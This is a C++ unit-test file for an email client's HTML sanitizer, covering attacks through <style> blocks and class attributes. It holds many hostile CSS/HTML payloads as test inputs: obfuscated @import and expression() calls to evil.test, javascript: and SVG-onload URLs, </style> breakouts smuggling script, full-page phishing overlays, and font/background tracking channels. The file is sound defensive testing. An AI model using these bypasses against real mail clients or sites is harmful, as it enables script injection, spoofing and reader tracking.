/// @file test_css.cpp
/// @brief Attacks against `<style>` blocks and `class` attributes.
///
/// Written the same way as test_html.cpp: every case here is a bypass a real
/// message would attempt, not a happy-path check. `<style>` and `class` used
/// to be dropped outright; this file exists because admitting them means
/// admitting a whole CSS surface — selectors, at-rules, comments, escapes —
/// that a naive filter reliably gets wrong.
///
/// These tests are written against the INTENDED policy, not the current
/// implementation. They are expected to fail until the `<style>`-block work
/// lands; a compile error is a bug in this file, a failing assertion is a gap
/// in the implementation.

#include <gtest/gtest.h>

#include <chrono>
#include <string>

#include "mailengine/html.hpp"

using namespace mailengine::html;

namespace {

std::string clean(const std::string& input) { return sanitize(input).html; }

/// True when the output contains `needle`, case-insensitively.
bool contains(const std::string& haystack, const std::string& needle) {
  auto lower = [](std::string s) {
    for (auto& c : s) c = static_cast<char>(std::tolower(static_cast<unsigned char>(c)));
    return s;
  };
  return lower(haystack).find(lower(needle)) != std::string::npos;
}

}  // namespace

// MARK: - Good CSS must survive
//
// The implementation cannot pass these tests by dropping everything. A
// two-column layout that survives styled and a two-column layout that
// survives as plain stacked divs are both "safe", but only one of them is the
// message the sender wrote.

TEST(Css, KeepsOrdinaryRulesAndClassAttributes) {
  const auto html = clean(
      "<style>.card{color:#fff;background-color:#003057;padding:10px}</style>"
      "<div class=\"card\">hi</div>");
  EXPECT_TRUE(contains(html, "class=\"card\""));
  EXPECT_TRUE(contains(html, "color:#fff"));
  EXPECT_TRUE(contains(html, "background-color:#003057"));
  EXPECT_TRUE(contains(html, "hi"));
}

TEST(Css, TwoColumnLayoutWithClassesAndMediaQuerySurvives) {
  // The exact shape of a responsive marketing layout: a class-based grid that
  // collapses to one column under a max-width media query. Losing either half
  // — the classes or the @media block — breaks the design on some viewport.
  const std::string input =
      "<style>"
      ".col{width:50%;float:left;box-sizing:border-box}"
      "@media (max-width:600px){.col{width:100%;float:none}}"
      "</style>"
      "<div class=\"col\">Left</div><div class=\"col\">Right</div>";
  const auto html = clean(input);
  EXPECT_TRUE(contains(html, "class=\"col\""));
  EXPECT_TRUE(contains(html, "width:50%"));
  EXPECT_TRUE(contains(html, "@media"));
  EXPECT_TRUE(contains(html, "600px"));
  EXPECT_TRUE(contains(html, "width:100%"));
  EXPECT_TRUE(contains(html, "Left"));
  EXPECT_TRUE(contains(html, "Right"));
}

TEST(Css, StyleTagItselfSurvivesInOutput) {
  const auto html = clean("<style>a{color:red}</style><p>x</p>");
  EXPECT_TRUE(contains(html, "<style"));
  EXPECT_TRUE(contains(html, "color:red"));
}

TEST(Css, KeepsNestedRulesInsideMediaBlock) {
  // The rule is only useful if what is nested inside @media actually reaches
  // the page, not just the "@media" keyword itself.
  const auto html = clean(
      "<style>@media screen{.a{color:red}.b{color:blue}}</style>"
      "<div class=\"a\">x</div><div class=\"b\">y</div>");
  EXPECT_TRUE(contains(html, "color:red"));
  EXPECT_TRUE(contains(html, "color:blue"));
}

// MARK: - @import: the primary remote-fetch vector
//
// @import pulls in an entire second stylesheet chosen by the sender, which
// bypasses every declaration-level check applied to this document's own CSS.

TEST(Css, DropsImportInEverySpelling) {
  for (const std::string body : {
           "@import url(http://evil.test/track.css);a{color:red}",
           "@import \"http://evil.test/track.css\";a{color:red}",
           "@import 'http://evil.test/track.css';a{color:red}",
           "@import url(\"http://evil.test/track.css\") screen;a{color:red}",
           "@import url(http://evil.test/track.css) screen and (max-width:600px);"
           "a{color:red}",
           "@IMPORT URL(http://evil.test/track.css);a{color:red}",
           "   @import url(http://evil.test/track.css);a{color:red}",
           "\n\t@import url(http://evil.test/track.css);a{color:red}",
       }) {
    const auto out = sanitize("<style>" + body + "</style>");
    EXPECT_FALSE(contains(out.html, "evil.test")) << body;
    EXPECT_FALSE(contains(out.html, "@import")) << body;
    EXPECT_TRUE(out.removed_active_content) << body;
    // The rule after the @import must still render — dropping the whole
    // block over one bad line is not what the policy asks for.
    EXPECT_TRUE(contains(out.html, "color:red")) << body;
  }
}

TEST(Css, DropsImportHiddenBehindALeadingComment) {
  // A comment placed before the at-keyword so a filter anchored to the start
  // of the string, or to `<style>`, misses it.
  const auto out =
      sanitize("<style>/* stylesheet */@import url(http://evil.test/x.css);"
                "a{color:red}</style>");
  EXPECT_FALSE(contains(out.html, "evil.test"));
  EXPECT_FALSE(contains(out.html, "@import"));
}

TEST(Css, DropsImportSplitAcrossACommentInTheKeyword) {
  // `@im/**/port` is not the string "@import", so a filter that string-matches
  // BEFORE stripping comments never sees it — and a browser, which strips
  // comments before tokenizing, imports it anyway.
  const auto out =
      sanitize("<style>@im/**/port url(http://evil.test/x.css);a{color:red}</style>");
  EXPECT_FALSE(contains(out.html, "evil.test"));
}

// MARK: - Comments used to split banned keywords
//
// CSS comments are not meaningful to the parser but ARE meaningful to a naive
// substring filter: stripping them changes what substrings exist.

TEST(Css, CatchesExpressionSplitByComment) {
  const auto out = sanitize(
      "<style>div{width:expr/**/ession(alert(1));color:red}</style>");
  EXPECT_FALSE(contains(out.html, "alert"));
  EXPECT_FALSE(contains(out.html, "width:"));
  EXPECT_TRUE(contains(out.html, "color:red"));
  EXPECT_TRUE(out.removed_active_content);
}

TEST(Css, CatchesJavascriptSchemeSplitByCommentInsideUrl) {
  const auto out = sanitize(
      "<style>a{background-image:url(java/**/script:alert(1))}</style>");
  EXPECT_FALSE(contains(out.html, "alert"));
  EXPECT_FALSE(contains(out.html, "background-image:"));
}

TEST(Css, CommentInsideASelectorDoesNotHideTheDeclarationCheck) {
  // A comment can legally sit inside a selector list too; the declaration
  // that follows still has to go through the same checks.
  const auto out =
      sanitize("<style>a/*x*/,b{position:fixed;color:red}</style>");
  EXPECT_FALSE(contains(out.html, "position"));
  EXPECT_TRUE(contains(out.html, "color:red"));
}

// MARK: - Backslash escapes
//
// CSS escapes let any character, including ones that spell a banned keyword,
// be written as `\` followed by a codepoint. `style_value_is_dangerous`
// already rejects any backslash outright at the attribute level for exactly
// this reason; a <style> block needs the same treatment.

TEST(Css, CatchesShortHexEscapedExpression) {
  const auto out = sanitize(
      "<style>div{width:\\65xpression(alert(1));color:red}</style>");
  EXPECT_FALSE(contains(out.html, "alert"));
  EXPECT_FALSE(contains(out.html, "width:"));
  EXPECT_TRUE(contains(out.html, "color:red"));
}

TEST(Css, CatchesLongFormHexEscapedExpression) {
  // The full six-hex-digit form of the same escape.
  const auto out = sanitize(
      "<style>div{width:\\000065xpression(alert(1));color:red}</style>");
  EXPECT_FALSE(contains(out.html, "alert"));
  EXPECT_FALSE(contains(out.html, "width:"));
}

TEST(Css, CatchesBackslashEscapedQuoteInUrl) {
  // A backslash-escaped quote can be used to make a `url("...")` string
  // appear to end earlier or later than it really does to a naive scanner.
  const auto out = sanitize(
      "<style>a{background:url(\"http://x/\\\"onerror=alert(1)\")}</style>");
  EXPECT_FALSE(contains(out.html, "alert"));
}

// MARK: - Entity decoding inside <style>
//
// The declaration parser used for the `style` ATTRIBUTE already had a bug
// where `&#39;` — which ends in a semicolon — was treated as a declaration
// separator, silently dropping every rule after it. If `<style>`-block
// parsing shares that declaration splitter, it inherits the same bug, and
// entity-encoded payloads must still be caught AFTER decoding, not before.

TEST(Css, SemicolonEndingEntityDoesNotSplitDeclarationsInAStyleBlock) {
  const auto html = clean(
      "<style>a{font-family:&#39;Roboto&#39;,Arial;background-color:#003366;"
      "padding:10px}</style>");
  EXPECT_TRUE(contains(html, "background-color:#003366"));
  EXPECT_TRUE(contains(html, "padding:10px"));
}

TEST(Css, DecodesEntitiesInAStyleBlockBeforeCatchingExpression) {
  const auto out = sanitize(
      "<style>div{width:&#101;xpression(alert(1));color:red}</style>");
  EXPECT_FALSE(contains(out.html, "expression"));
  // Not merely still-encoded: the encoded spelling must not survive either,
  // or a browser that decodes it on render defeats this check entirely.
  EXPECT_FALSE(contains(out.html, "&#101;"));
  EXPECT_FALSE(contains(out.html, "width:"));
  EXPECT_TRUE(contains(out.html, "color:red"));
}

TEST(Css, DecodesEntityEncodedUrlSchemeInAStyleBlock) {
  const auto out = sanitize(
      "<style>a{background-image:url(&#106;avascript:alert(1))}</style>");
  EXPECT_FALSE(contains(out.html, "javascript"));
  EXPECT_FALSE(contains(out.html, "alert"));
}

// MARK: - Breaking out of the <style> element
//
// `<style>` content is scanned as raw text up to the literal `</style`, both
// on the way IN (parsing the sender's document) and on the way OUT (whatever
// this sanitizer re-emits). Either side getting this wrong is a script
// injection: if parsing misses a closing tag the rest of the document is
// silently swallowed; if re-emission lets an allowed CSS value carry the
// literal bytes `</style`, the browser closes the tag early on ITS pass and
// executes whatever comes after — regardless of what that content meant as
// CSS.

TEST(Css, ClosingStyleTagEndsTheBlockAndTheFollowingScriptIsStillRemoved) {
  const auto out = sanitize(
      "<style>body{color:red}</style><script>alert(1)</script><p>after</p>");
  EXPECT_FALSE(contains(out.html, "alert"));
  EXPECT_TRUE(contains(out.html, "color:red"));
  EXPECT_TRUE(contains(out.html, "after"));
}

TEST(Css, UppercaseClosingStyleTagIsRecognised) {
  // If the parser looks only for lowercase `</style>`, it never finds the end
  // of the block and either swallows the rest of the document (the void-
  // element bug this codebase has already hit once) or emits the attacker's
  // markup as literal CSS text.
  const auto out = sanitize(
      "<style>body{color:red}</STYLE><script>alert(1)</script><p>after</p>");
  EXPECT_FALSE(contains(out.html, "alert"));
  EXPECT_TRUE(contains(out.html, "after"));
}

TEST(Css, ClosingStyleTagWithTrailingJunkIsStillRecognised) {
  // HTML5 end-tag matching only requires the tag name to match; `</style `
  // followed by anything up to `>` still closes the element in a real parser.
  const auto out = sanitize(
      "<style>body{color:red}</style foo=\"bar\"><script>alert(1)</script>"
      "<p>after</p>");
  EXPECT_FALSE(contains(out.html, "alert"));
  EXPECT_TRUE(contains(out.html, "after"));
}

TEST(Css, FontFamilyValueCannotSmuggleAClosingStyleTag) {
  // `font-family` is an allowed property and a quoted string is a legal
  // value, but the string's CONTENTS are attacker-controlled. If the value is
  // re-emitted into the output verbatim, a browser scanning for `</style`
  // still closes the tag here — it does not know or care that this text was
  // inside a quoted CSS string when it was written.
  const auto out = sanitize(
      "<style>a{font-family:\"</style><script>alert(1)</script>\"}</style>");
  EXPECT_FALSE(contains(out.html, "<script>alert(1)</script>"));
}

TEST(Css, SelectorAttributeValueCannotSmuggleAClosingStyleTag) {
  // Selectors are not declaration values, so the value-sanitizing pass that
  // would catch the case above does not even look at them. An attribute
  // selector's string literal is just as attacker-controlled.
  const auto out = sanitize(
      "<style>a[title=\"</style><script>alert(1)</script>\"]{color:red}"
      "</style>");
  EXPECT_FALSE(contains(out.html, "<script>alert(1)</script>"));
}

TEST(Css, RawLessThanInsideUnterminatedStyleContentDoesNotBecomeATag) {
  // Before the real `</style>` is reached, a literal `<script>` inside the
  // CSS text is just characters to a raw-text scanner. It must stay inert
  // even though the rule around it is garbage and gets dropped.
  const auto out = sanitize(
      "<style>a{color:red}<script>alert(1)</script>b{color:blue}</style>");
  EXPECT_FALSE(contains(out.html, "<script>"));
  EXPECT_FALSE(contains(out.html, "alert(1)"));
}

TEST(Css, UnterminatedStyleBlockDoesNotHang) {
  // No closing tag at all. Consistent with the established behaviour for an
  // unterminated <script> (see test_html.cpp,
  // HandlesUnterminatedScriptByDroppingTheRest): the rest of the document is
  // dropped rather than risk spilling raw CSS/script text onto the page. The
  // requirement under test here is simply that this terminates and does not
  // leak the payload.
  const auto html = clean("<p>before</p><style>body{color:red}<script>alert(1)");
  EXPECT_TRUE(contains(html, "before"));
  EXPECT_FALSE(contains(html, "alert"));
}

// MARK: - Overlay and interface-spoofing attacks
//
// A message that can position an element on top of the reading pane can draw
// fake app chrome — a fake "sign in again" dialog, a fake unread badge — none
// of which the sender should be able to produce.

TEST(Css, DropsPositioningPropertiesInAStyleBlockRule) {
  const auto out = sanitize(
      "<style>div{position:fixed;top:0;left:0;z-index:9999;color:red}"
      "</style>");
  EXPECT_FALSE(contains(out.html, "position"));
  EXPECT_FALSE(contains(out.html, "top:"));
  EXPECT_FALSE(contains(out.html, "left:"));
  EXPECT_FALSE(contains(out.html, "z-index"));
  EXPECT_TRUE(contains(out.html, "color:red"));
}

TEST(Css, DropsFullPageOverlayViaWildcardSelector) {
  // The universal selector applies to every element in the document,
  // including ones the sanitizer added itself. This is the shape of a
  // fake-chrome phishing overlay: cover everything, draw a lookalike dialog.
  const auto out = sanitize(
      "<style>*{position:fixed;top:0;left:0;width:100%;height:100%;"
      "z-index:2147483647;background:#fff}</style>");
  EXPECT_FALSE(contains(out.html, "position"));
  EXPECT_FALSE(contains(out.html, "z-index"));
}

TEST(Css, DropsTransformProperty) {
  const auto out =
      sanitize("<style>div{transform:translate(9999px,9999px);color:red}</style>");
  EXPECT_FALSE(contains(out.html, "transform"));
  EXPECT_TRUE(contains(out.html, "color:red"));
}

TEST(Css, DropsContentProperty) {
  // `content` on a pseudo-element injects text that never appeared in the
  // sanitizer's escaped output, and can itself carry `attr()` or `url()`.
  const auto out = sanitize(
      "<style>a::before{content:\"WIRE TRANSFER APPROVED\";color:red}</style>");
  EXPECT_FALSE(contains(out.html, "content:"));
  EXPECT_TRUE(contains(out.html, "color:red"));
}

// MARK: - url() scheme attacks inside <style> blocks

TEST(Css, RejectsJavascriptUrlInAStyleBlockRule) {
  const auto out =
      sanitize("<style>a{background:url(javascript:alert(1))}</style>");
  EXPECT_FALSE(contains(out.html, "javascript"));
  EXPECT_TRUE(out.removed_active_content);
}

TEST(Css, RejectsJavascriptUrlWithInternalWhitespace) {
  const auto out =
      sanitize("<style>a{background:url( javascript:alert(1) )}</style>");
  EXPECT_FALSE(contains(out.html, "javascript"));
}

TEST(Css, RejectsJavascriptUrlRegardlessOfCase) {
  const auto out =
      sanitize("<style>a{background:url(JAVASCRIPT:alert(1))}</style>");
  EXPECT_FALSE(contains(out.html, "alert"));
}

TEST(Css, RejectsVbscriptUrl) {
  const auto out = sanitize("<style>a{background:url('vbscript:msgbox(1)')}</style>");
  EXPECT_FALSE(contains(out.html, "vbscript"));
}

TEST(Css, RejectsDataHtmlUrlInAStyleBlockRule) {
  const auto out = sanitize(
      "<style>a{background:url(\"data:text/html,<script>alert(1)</script>\")}"
      "</style>");
  EXPECT_FALSE(contains(out.html, "text/html"));
  EXPECT_FALSE(contains(out.html, "<script"));
}

TEST(Css, RejectsDataSvgUrlInAStyleBlockRule) {
  // SVG is a document format smuggled in as an "image": it can carry
  // <script> and event handlers of its own.
  const auto out = sanitize(
      "<style>a{background-image:url(\"data:image/svg+xml,"
      "<svg onload=alert(1)>\")}</style>");
  EXPECT_FALSE(contains(out.html, "svg+xml"));
  EXPECT_FALSE(contains(out.html, "onload"));
}

TEST(Css, AcceptsRasterDataUrlInAStyleBlockRule) {
  const auto out = sanitize(
      "<style>a{background-image:url(data:image/png;base64,iVBORw0KGgo=)}"
      "</style>");
  EXPECT_TRUE(contains(out.html, "data:image/png;base64,iVBORw0KGgo="));
}

TEST(Css, AcceptsOrdinarySchemesInAStyleBlockRule) {
  const auto out = sanitize(
      "<style>a{background-image:url(https://cdn.test/hero.jpg)}</style>");
  EXPECT_TRUE(contains(out.html, "https://cdn.test/hero.jpg"));
}

// MARK: - expression / behavior / binding

TEST(Css, DropsLegacyIeExpressionInAStyleBlockRule) {
  const auto out = sanitize(
      "<style>div{width:expression(document.location='http://evil.test');"
      "color:red}</style>");
  EXPECT_FALSE(contains(out.html, "expression"));
  EXPECT_FALSE(contains(out.html, "evil.test"));
  EXPECT_TRUE(contains(out.html, "color:red"));
}

TEST(Css, DropsBehaviorPropertyInAStyleBlockRule) {
  const auto out =
      sanitize("<style>div{behavior:url(#default#time2);color:red}</style>");
  EXPECT_FALSE(contains(out.html, "behavior"));
  EXPECT_TRUE(contains(out.html, "color:red"));
}

TEST(Css, DropsMozBindingInAStyleBlockRule) {
  const auto out = sanitize(
      "<style>div{-moz-binding:url(http://evil.test/x.xml);color:red}</style>");
  EXPECT_FALSE(contains(out.html, "binding"));
  EXPECT_FALSE(contains(out.html, "evil.test"));
}

// MARK: - Properties outside the allowlist

TEST(Css, DropsPropertiesOutsideTheAllowlistInAStyleBlockRule) {
  for (const std::string prop :
       {"cursor", "animation", "transition", "pointer-events", "filter"}) {
    const auto out =
        sanitize("<style>div{" + prop + ":evil;color:red}</style>");
    EXPECT_FALSE(contains(out.html, prop + ":")) << prop;
    EXPECT_TRUE(contains(out.html, "color:red")) << prop;
  }
}

TEST(Css, DropsArbitraryCustomProperties) {
  // `--name` custom properties are not on the allowlist, but they are also
  // not caught by the dangerous-value marker scan when the value itself
  // looks innocuous. If they are not rejected as "not an allowlisted
  // property" they become a place to stash anything.
  const auto out = sanitize("<style>:root{--evil:anything;color:red}</style>");
  EXPECT_FALSE(contains(out.html, "--evil"));
  EXPECT_TRUE(contains(out.html, "color:red"));
}

TEST(Css, DropsCustomPropertyUsedToSmuggleADangerousUrlAcrossTwoDeclarations) {
  // Each declaration is plausibly checked independently. Neither one alone
  // contains the string "javascript:" next to a "url(": the custom property
  // holds the scheme, and the consuming declaration only holds `var(--u)`,
  // which has no colon at all and would pass a scheme check that only
  // inspects the literal text of the url() it is looking at. A browser
  // resolves `var()` at computed-value time, after this filter has already
  // approved both declarations independently. The custom-property
  // declaration must not survive AT ALL — see DropsArbitraryCustomProperties
  // — which is what actually closes this, not the url() check.
  const auto out = sanitize(
      "<style>:root{--u:javascript:alert(1)}a{background:url(var(--u))}"
      "</style>");
  EXPECT_FALSE(contains(out.html, "javascript"));
  EXPECT_FALSE(contains(out.html, "alert"));
}

// MARK: - Malformed and pathological CSS
//
// A message is untrusted input, so malformed CSS has to degrade safely, not
// crash, hang, or fall back to emitting the raw bytes.

TEST(Css, UnclosedRuleInATerminatedStyleTagDoesNotHang) {
  // The `<style>...</style>` HTML boundary is well-formed; the CSS inside it
  // is not — the rule's `{` is never closed.
  const auto html =
      clean("<style>body{color:red</style><p>after</p>");
  EXPECT_TRUE(contains(html, "after"));
}

TEST(Css, StrayClosingBraceDoesNotBreakParsing) {
  const auto html =
      clean("<style>}color:red{a{color:blue}</style><p>after</p>");
  EXPECT_TRUE(contains(html, "after"));
}

TEST(Css, MediaQueryMissingClosingBraceDoesNotHang) {
  const auto html = clean(
      "<style>@media screen{body{color:red}</style><p>after</p>");
  EXPECT_TRUE(contains(html, "after"));
}

TEST(Css, DeeplyNestedAtRulesTerminate) {
  std::string body;
  for (int i = 0; i < 500; ++i) body += "@media screen{";
  body += "a{color:red}";
  for (int i = 0; i < 500; ++i) body += "}";

  const auto start = std::chrono::steady_clock::now();
  const auto html = clean("<style>" + body + "</style><p>after</p>");
  const auto elapsed = std::chrono::steady_clock::now() - start;

  EXPECT_TRUE(contains(html, "after"));
  EXPECT_LT(elapsed, std::chrono::seconds(5));
}

TEST(Css, LargeStylesheetTerminatesQuickly) {
  // A pathological but plausible size: thousands of declarations, the shape
  // an O(n^2) declaration scanner (e.g. a `find` per byte) would choke on.
  std::string body;
  body.reserve(200000);
  for (int i = 0; i < 8000; ++i) {
    body += ".c" + std::to_string(i) + "{color:red;padding:1px}";
  }

  const auto start = std::chrono::steady_clock::now();
  const auto html = clean("<style>" + body + "</style><p>after</p>");
  const auto elapsed = std::chrono::steady_clock::now() - start;

  EXPECT_TRUE(contains(html, "after"));
  EXPECT_LT(elapsed, std::chrono::seconds(5));
}

TEST(Css, ManyUnclosedCommentOpenersTerminateQuickly) {
  // CSS comments do not nest, but a scanner that mishandles that fact —
  // re-scanning from each `/*` instead of jumping past the matched `*/` — is
  // quadratic in the number of openers.
  std::string body;
  body.reserve(100000);
  for (int i = 0; i < 20000; ++i) body += "/*";
  body += "*/a{color:red}";

  const auto start = std::chrono::steady_clock::now();
  const auto html = clean("<style>" + body + "</style><p>after</p>");
  const auto elapsed = std::chrono::steady_clock::now() - start;

  EXPECT_TRUE(contains(html, "after"));
  EXPECT_LT(elapsed, std::chrono::seconds(5));
}

// MARK: - `class` cannot be used to break attribute quoting

TEST(Css, ClassAttributeValueCannotBreakOutOfItsQuotes) {
  const auto html =
      clean("<div class=\"x\" onmouseover=\"alert(1)\">t</div>");
  EXPECT_FALSE(contains(html, "onmouseover"));
  EXPECT_FALSE(contains(html, "alert"));
}

// MARK: - Tracking parity between <img> and CSS backgrounds
//
// `allow_remote_images` defaults to off specifically to stop tracking pixels.
// A `<style>` rule with a remote `background-image` reaches exactly the same
// destination as an `<img src>` did, and admitting `<style>` content must not
// quietly reopen a hole the `<img>` path already closed.

TEST(Css, RemoteBackgroundImageInAStyleBlockIsNotFetchedByDefault) {
  const auto out = sanitize(
      "<style>body{background-image:url(https://tracker.example/pixel.gif)}"
      "</style>");
  // Whatever the mechanism — dropped, or rewritten the way <img src> is —
  // the literal live URL must not reach a live `url(https://...)` that
  // WebKit would fetch unconditionally on render.
  EXPECT_FALSE(contains(out.html, "url(https://tracker.example"));
}

TEST(Css, RemoteBackgroundImageInAStyleBlockIsFetchedWhenExplicitlyAllowed) {
  SanitizeOptions options;
  options.allow_remote_images = true;
  const auto out = sanitize(
      "<style>body{background-image:url(https://cdn.example/hero.jpg)}"
      "</style>",
      options);
  EXPECT_TRUE(contains(out.html, "cdn.example/hero.jpg"));
}

// MARK: - Font descriptors as a tracking channel
//
// A webfont is fetched only when glyphs in its `unicode-range` actually
// render, so a sender can slice the range across several faces and learn WHICH
// CHARACTERS were painted — that the message was opened, and something about
// what it contained. It is governed by `font-src`, not `img-src`, so the
// remote-images preference does not cover it at all.
//
// `@font-face` is already dropped by `sanitize_stylesheet`, which keeps only
// `@media` and ordinary rules. That is incidental rather than intended, and
// this pins it: measured against a local HTTP server, a document carrying this
// rule DID fetch the font under our CSP, so the sanitiser is the defence that
// actually works here.

TEST(Css, DropsFontFaceWhichIsATrackingChannelImgSrcDoesNotCover) {
  const auto out = sanitize(
      "<style>@font-face{font-family:TrackMe;src:url(https://tracker.test/f.woff);"
      "unicode-range:U+0041-005A}.t{color:red}</style>");
  EXPECT_FALSE(contains(out.html, "font-face"));
  EXPECT_FALSE(contains(out.html, "tracker.test"));
  EXPECT_FALSE(contains(out.html, "unicode-range"));
  // The ordinary rule beside it still survives.
  EXPECT_TRUE(contains(out.html, "color:red"));
}

TEST(Css, DropsFontFaceRegardlessOfSpelling) {
  for (const std::string spelling : {"@font-face", "@FONT-FACE", "@font-FACE",
                                     "@font/**/-face"}) {
    const auto out = sanitize(
        "<style>" + spelling +
        "{font-family:X;src:url(https://tracker.test/f.woff)}.a{color:red}</style>");
    EXPECT_FALSE(contains(out.html, "tracker.test")) << spelling;
    EXPECT_TRUE(contains(out.html, "color:red")) << spelling;
  }
}
